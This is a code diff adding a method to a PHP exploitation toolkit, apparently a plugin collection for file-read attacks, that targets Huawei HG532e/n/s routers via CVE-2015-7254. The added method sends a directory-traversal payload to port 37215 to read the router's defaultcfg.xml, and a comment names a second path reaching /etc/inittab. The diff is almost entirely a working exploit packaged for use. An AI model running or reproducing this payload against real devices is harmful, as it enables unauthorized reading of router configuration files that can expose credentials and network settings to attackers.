@@ -69,6 +69,22 @@ class Lfiplugins extends Larfi {
 		return $this->uri_based_lfi($blankurl,$url,$payload);
 
 	}
+    /**
+     * Huawei_lfi
+     * cve-2015-7254
+     * Directory traversal vulnerability on Huawei HG532e, HG532n, and HG532s devices allows remote attackers to read arbitrary files via a .. (dot dot) in an icon/ URI.
+     * @param \Base $f3
+     * Alternative file read: http://<target_IP>:37215/icon/../../../etc/inittab.
+     */
+    public function huawei_lfi(\Base $f3){
+        $lfi=new Larfi();
+        $f3->set('exploit_title', 'HUAWEI LFI (cve-2015-7254) Huawei HG532e, HG532n, & HG532s');
+        $this->response->data['SUBPART'] = 'lfi_page.html';
+        $url=$f3->get('POST.url');
+        $payload=":37215/icon/../../../etc/defaultcfg.xml";
+        return $this->uri_based_lfi($blankurl,$url,$payload);
+
+    }
 	
 	
 }
